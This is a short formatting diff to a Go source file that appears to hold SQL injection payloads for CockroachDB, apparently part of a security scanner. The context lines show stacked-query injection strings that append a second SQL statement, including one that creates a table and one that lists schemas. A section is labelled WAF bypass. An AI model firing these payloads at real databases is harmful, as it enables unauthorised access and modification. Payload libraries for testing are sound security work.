@@ -61,7 +61,7 @@ var CockroachDB = PayloadGroup{
 		// STACKED QUERIES
 		// ===========================================
 		{Type: "stacked", Content: "'; SELECT 1;"},
-		{Type: "stacked", Content: "'; CREATE TABLE t1 (c1 INT);--"},  // CockroachDB DDL in txns
+		{Type: "stacked", Content: "'; CREATE TABLE t1 (c1 INT);--"}, // CockroachDB DDL in txns
 
 		// ===========================================
 		// WAF BYPASS
@@ -107,4 +107,3 @@ var CockroachDB = PayloadGroup{
 		{Type: "stacked", Content: "'; SHOW SCHEMAS;--"},
 	},
 }
-
